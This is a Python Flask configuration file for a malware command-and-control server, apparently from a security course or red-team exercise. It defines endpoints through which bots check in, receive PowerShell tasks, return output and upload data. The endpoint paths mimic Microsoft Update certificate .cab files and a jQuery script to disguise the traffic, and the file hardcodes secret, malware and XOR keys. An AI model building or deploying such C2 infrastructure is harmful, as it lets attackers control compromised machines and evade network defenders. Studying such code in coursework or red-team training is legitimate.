from flask import Flask

app = Flask(__name__)
#64 MB max download size
app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'

app.config['ENDPOINTS'] = {}
app.config['ENDPOINTS']['HEARTBEAT'] = '/docroot/js/jquery-ui-1.11.2.custom.min.js'
app.config['ENDPOINTS']['INFO'] = '/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab'
app.config['ENDPOINTS']['PS'] = '/msdownload/update/v3/static/trustedr/en/authrootstl.cab'
app.config['ENDPOINTS']['OUT'] = '/msdownload/update/v3/static/untrusted/en/trustedinstaller.cab'
app.config['ENDPOINTS']['UPLOAD'] = '/msdownload/update/v3/static/untrustedr/en/authroot.cab'

app.config['DB_NAME'] = "db.sqlite"
app.config['COOKIE_NAME'] = "X-Session-ID" 
app.secret_key = b'csec476malware'
app.malware_key = "CSEC476"
app.xor_key = 0x7f
app.info_on_first_checkin = True
app.pwnboard_enabled = False
app.pwnboard_host = "pwnboard"

from c2.api import auth
from c2.api import bot_communication
from c2.api import action
from c2.api import fetch_data
from c2.database import dbmain
dbmain.initdb()
